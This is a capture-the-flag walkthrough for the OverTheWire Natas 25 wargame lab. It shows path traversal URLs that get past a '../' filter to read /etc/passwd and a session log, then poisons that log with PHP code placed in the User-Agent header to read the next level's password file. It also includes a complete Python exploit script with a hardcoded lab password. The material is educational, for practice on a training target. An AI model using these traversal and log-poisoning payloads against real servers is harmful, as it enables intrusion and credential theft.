# 🕸️Natas Level 25 → Level 26

```
http://natas25.natas.labs.overthewire.org
```
Username: natas25  
Password: (natas25_password)

![n25s1](n25s1.png)

Go to the source page.

![n25s2](n25s2.png)
![n25s3](n25s3.png)
![n25s4](n25s4.png)

Next, we attempted a path traversal attack; however, it was unsuccessful.
```
http://natas25.natas.labs.overthewire.org/?lang=../../../../../../../etc/passwd
```
![n25s5](n25s5.png)

We then analyze the ``safeinclude()`` function to understand its behavior.

![n25s6](n25s6.png)

Next, we refined our **path traversal attack**, which successfully bypassed the restrictions.
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//etc/passwd
```
![n25s7](n25s7.png)

We then tried to access the password for natas26, but the effort failed.
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//etc/natas_webpass/natas26
```
![n25s8](n25s8.png)

Then, we reviewed the ``safeinclude()`` function again.

![n25s9](n25s9.png)

In the ``logRequest()`` function, we discovered an interesting path leading to a log file.
```
/var/www/natas/natas25/logs/natas25_cookievalue.log
```
![n25s10](n25s10.png)

The next step is to try accessing the **log file**.
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_66ds804rhmqv922bebs70vjck7.log
```
![n25s11](n25s11.png)

Then, we saw some **User-Agent** information and a PHP warning.

![n25s12](n25s12.png)

What if we inject something malicious into the **User-Agent** to get our desired result?
```
<?php System("cat /etc/natas_webpass/natas26;"); ?>
```
### 🚀 Some Useful PHP Function
![php_function](php_function.png)

There are many ways to complete this challenge, and here I will demonstrate two of them.
- Method 1: 🔧 Web Security Testing Tools
- Method 2: 🐍 Python Script

### Method 1: 🔧 Web Security Testing Tools

Start by capturing the **request** packet, then send it to **Replay**.

![n25s13](n25s13.png)

Replace the **User-Agent** value with our payload. Then Click **Send**
```
<?php System("echo hello; cat /etc/natas_webpass/natas26; echo hello;"); ?>
```
![n25s14](n25s14.png)

We should now be able to view the flag in the HTTP response.

![n25s15](n25s15.png)

Then, we refreshed the page and saw the password for natas26.

![n25s16](n25s16.png)

### Method 2: 🐍 Python Script

```
import requests
import re


# Credentials for natas25
username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"

# Target URL
url = "http://natas25.natas.labs.overthewire.org"

# Start a session to persist cookies and headers across requests
session = requests.Session()

# send POST request
response = session.post(
    url,
    auth=(username, password)
)

# extract cookie value from the page
cookievalue = session.cookies["PHPSESSID"]
# path to the system log file
log_path = f"?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookievalue}.log"
# full url to the system log file
log_url = f"http://natas25.natas.labs.overthewire.org/{log_path}"
# PHP payload to inject into User-Agent
payload = "<?php System(\"echo natas26; cat /etc/natas_webpass/natas26; echo natas26;\"); ?>"
# Our malicious User-Agent
payload_header = {"User-Agent": payload}

# send GET request with our payloads
get_response = session.get(
    log_url,
    headers = payload_header,
    auth=(username, password)
)

# print the response
print(get_response.text)

```

Before executing, make sure the file has the proper permissions and then run it.

![n25s17](n25s17.png)

Finally, the password for **natas26** is displayed.

![n25s18](n25s18.png)

Awesome work! You’ve got the flag needed for the next challenge.




